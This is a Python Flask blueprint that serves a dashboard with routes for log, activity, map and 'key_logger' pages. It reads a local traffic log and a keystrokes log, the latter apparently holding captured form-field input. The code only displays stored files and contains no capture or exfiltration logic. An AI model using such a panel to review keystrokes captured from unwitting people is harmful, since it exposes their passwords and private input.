from flask import Blueprint, render_template
import os, json, re

ui_bp = Blueprint('ui', __name__)

BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
LOG_DIR = os.path.join(BASE_DIR, 'logs')
LOG_FILE = os.path.join(LOG_DIR, 'traffic.json')
KEYSTROKES_FILE = os.path.join(LOG_DIR, 'keystrokes.log')

def clean_entry(entry):
    return re.sub(r'form\d+\.', '', entry)

@ui_bp.route('/')
def index():
    return render_template('index.html')

@ui_bp.route('/log_monitor')
def log_monitor():
    try:
        with open(LOG_FILE, 'r') as f:
            entries = [json.loads(line) for line in f if line.strip()]
    except FileNotFoundError:
        entries = []
    return render_template('log_monitor.html', entries=entries)

@ui_bp.route('/key_logger')
def key_logger():
    if not os.path.exists(KEYSTROKES_FILE):
        return render_template('key_logger.html', entries=[])
    
    with open(KEYSTROKES_FILE, 'r', encoding='utf-8') as f:
        raw = f.read().strip()
    entries = raw.split('\n\n')
    entries = [clean_entry(e) for e in entries]
    return render_template('key_logger.html', entries=entries)

@ui_bp.route('/activity_monitor')
def activity_monitor():
    try:
        with open(LOG_FILE, 'r') as f:
            entries = [json.loads(line) for line in f if line.strip()]
    except FileNotFoundError:
        entries = []
    return render_template('activity_monitor.html', entries=entries)

@ui_bp.route('/maps')
def maps():
    return render_template('maps.html')
